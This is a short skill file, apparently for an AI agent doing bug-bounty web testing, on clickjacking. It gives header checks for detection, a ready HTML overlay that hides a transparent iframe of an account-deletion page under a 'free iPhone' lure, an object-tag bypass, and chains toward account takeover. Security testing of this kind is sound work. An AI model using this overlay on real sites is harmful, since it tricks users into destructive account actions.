# SKILL: Clickjacking

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (clickjacking) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
UI redress via iframe + transparent overlay. Bug only when sensitive action exists & no X-Frame-Options/CSP frame-ancestors.

---

## DETECTION
`curl -I` for `X-Frame-Options` and `CSP frame-ancestors`. Absent or weak → frame-able.

## EXPLOITATION
```html
<style>
  iframe { width: 1280px; height: 800px; opacity: 0.0001; position: absolute; top: 0; left: 0; }
  .lure { position: absolute; top: 350px; left: 600px; cursor: pointer; z-index: 1; }
</style>
<div class="lure">CLAIM YOUR FREE iPHONE</div>
<iframe src="https://target.com/account/delete"></iframe>
```

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Use `<object>` instead of `<iframe>` if XFO blocks iframe but not object (rare).

## CHAIN POTENTIAL
Clickjacking → 2FA disable / email change / payment auth → ATO / financial.

## TOOLS
BurpClickbandit

## COMMANDS
Burp → Engagement Tools → Generate Clickjacking PoC

## EDGE CASES / NOT-A-BUG TRAPS
Only counts if exploitable action exists; clickjacking on `/about` is not a bug.

## TRIAGE ANGLE (per platform)
Show video PoC of overlay + sensitive action. Often closed Informative if no exploitable action shown.

## SEVERITY & CVSS
4.0–6.0.

## REFERENCES
PortSwigger Clickjacking
